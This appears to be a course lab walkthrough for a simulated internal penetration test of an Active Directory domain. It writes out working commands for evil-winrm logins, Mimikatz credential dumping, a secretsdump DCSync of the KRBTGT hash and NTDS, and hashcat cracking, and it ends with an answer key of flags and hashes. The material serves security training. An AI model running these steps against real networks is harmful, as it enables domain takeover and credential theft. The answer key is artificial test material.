# Section 07 �� Documentation & Reporting Practice Lab

> **Lab: yes** — Internal pentest against INLANEFREIGHT.LOCAL (172.16.5.0/24). Achieve Domain Admin, dump NTDS, crack hashes.

**Core principle:** Complete an internal penetration test simulation ��� enumerate the network, escalate privileges, compromise the domain, and document everything as if it were a real engagement.

---

## Attack chain

```
Testing VM (RDP as htb-student)
→ FILE01 (172.16.5.130) — local admin: administrator:Welcome123!
→ Mimikatz on FILE01 → clusteragent:007Agent (domain account)
→ evil-winrm to DC01 (172.16.5.5) as clusteragent
→ flag.txt on Administrator Desktop
→ secretsdump.py DCSync → KRBTGT hash + full NTDS dump
→ hashcat -m 1000 → crack svc_reporting → Reporter1!
→ net user svc_reporting /domain → Backup Operators
```

---

## Lab walkthrough

```
┌──────────────────────────────────────────────────────────────┐
│ VARIABLES                                                    │
├──────────────────────────────────────────────────────────────┤
│ TESTING_VM    = <SPAWN_IP> (RDP target)                      │
│ DC01          = 172.16.5.5                                   │
│ FILE01        = 172.16.5.130                                 │
│ Domain        = INLANEFREIGHT.LOCAL                          │
└──────────────────────────────────────────────────────────────┘

STEP 1: CONNECT TO TESTING VM
─────────────────────────────
1. RDP to testing VM
   xfreerdp3 /cert:ignore /dynamic-resolution +clipboard /compression /v:<SPAWN_IP> /u:htb-student /p:'HTB_@cademy_stdnt!'

STEP 2: ACCESS FILE01
─────────────────────
2. Connect to FILE01 with local admin creds
   evil-winrm -i 172.16.5.130 -u administrator -p 'Welcome123!'

3. Run Mimikatz to dump credentials
   → Finds clusteragent:007Agent (domain user with DC access)

STEP 3: COMPROMISE DC01
────────────────────────
4. Connect to DC01 as clusteragent
   evil-winrm -i 172.16.5.5 -u clusteragent -p '007Agent'

5. Read flag (Q1)
   type C:\Users\Administrator\Desktop\flag.txt
   → d0c_pwN_r3p0rt_reP3at!

STEP 4: DCSYNC — EXTRACT HASHES
────────────────────────────────
6. Dump KRBTGT hash (Q2)
   secretsdump.py INLANEFREIGHT/clusteragent:007Agent@172.16.5.5 -just-dc-user INLANEFREIGHT\\krbtgt
   → krbtgt:502:aad3b435b51404eeaad3b435b51404ee:16e26ba33e455a8c338142af8d89ffbc:::

7. Dump full NTDS
   secretsdump.py INLANEFREIGHT/clusteragent:007Agent@172.16.5.5 -just-dc-ntlm
   → Save all hashes to file for cracking

STEP 5: CRACK SVC_REPORTING HASH
─────────────────────────────────
8. Crack svc_reporting NTLM hash (Q3)
   hashcat -m 1000 svc_reporting_hash /usr/share/wordlists/rockyou.txt
   → Reporter1!

STEP 6: IDENTIFY GROUP MEMBERSHIP
──────────────────────────────────
9. Check svc_reporting group membership (Q4)
   net user svc_reporting /domain
   → Local Group Memberships: *Backup Operators
```

---

## Answers

| Question | Answer |
|----------|--------|
| Q1: flag.txt on DC01 Administrator Desktop | `d0c_pwN_r3p0rt_reP3at!` |
| Q2: KRBTGT NTLM hash | `16e26ba33e455a8c338142af8d89ffbc` |
| Q3: svc_reporting cracked password | `Reporter1!` |
| Q4: Powerful local group | `Backup Operators` |

---

## Key takeaways

- **Backup Operators is a powerful local group** — members have SeBackupPrivilege which allows reading any file on the system, including SAM/NTDS.dit. A compromised svc_reporting account could be used for lateral movement across any host where it has this membership.
- **clusteragent with domain access to DC** — demonstrates why service accounts with excessive privileges are high-risk findings.
- **secretsdump DCSync requires specifying NetBIOS domain** — use `INLANEFREIGHT\\krbtgt` format when you get "NAME_ERROR_NOT_UNIQUE" errors.
- **Document as you go** — this lab simulates taking over mid-engagement from another tester. Clean notes saved them (and you).
